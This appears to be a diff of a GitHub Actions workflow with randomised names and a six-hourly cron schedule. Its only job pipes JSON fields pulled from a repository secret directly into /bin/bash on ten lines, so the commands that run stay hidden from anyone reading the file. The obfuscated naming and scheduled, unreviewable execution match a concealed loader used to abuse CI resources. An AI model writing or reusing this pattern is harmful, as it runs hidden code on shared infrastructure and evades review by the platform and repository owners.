@@ -1,27 +1,27 @@
 name: zhaobencong6251
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 2/6 * * *'
-
-jobs:  # 18129
+    - cron: '42 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhaobencong6251
         env:
-          i0051: ${{ secrets.i0051 }}
+          az9684: ${{ secrets.az9684 }}
         run: |
-          echo $i0051 | jq -r .uryw9 | /bin/bash
-          echo $kqib54 | jq -r .di1631 | /bin/bash
-          echo $xsshv83 | jq -r .y3753 | /bin/bash
-          echo $isrzp80466 | jq -r .jas5 | /bin/bash
-          echo $rv29 | jq -r .yjy12 | /bin/bash
-          echo $kxfls253 | jq -r .atw705 | /bin/bash
-          echo $v43320 | jq -r .x24 | /bin/bash
-          echo $wt41566 | jq -r .txi9779 | /bin/bash
-          echo $xo29993 | jq -r .zkolw95 | /bin/bash
-          echo $mnz475 | jq -r .eex7989 | /bin/bash
-          echo $sii36937 | jq -r .xcf3 | /bin/bash
+          echo $az9684 | jq -r .wlsy6227 | /bin/bash
+          echo $wzvav782 | jq -r .qq373 | /bin/bash
+          echo $tcwr87674 | jq -r .vrcx1237 | /bin/bash
+          echo $nxg36535 | jq -r .e2939 | /bin/bash
+          echo $kzgn5 | jq -r .mw295 | /bin/bash
+          echo $wh13 | jq -r .fvnx69 | /bin/bash
+          echo $fq9 | jq -r .si4074 | /bin/bash
+          echo $kmc50 | jq -r .z9360 | /bin/bash
+          echo $s64105 | jq -r .diud1407 | /bin/bash
+          echo $art99513 | jq -r .te801 | /bin/bash
 
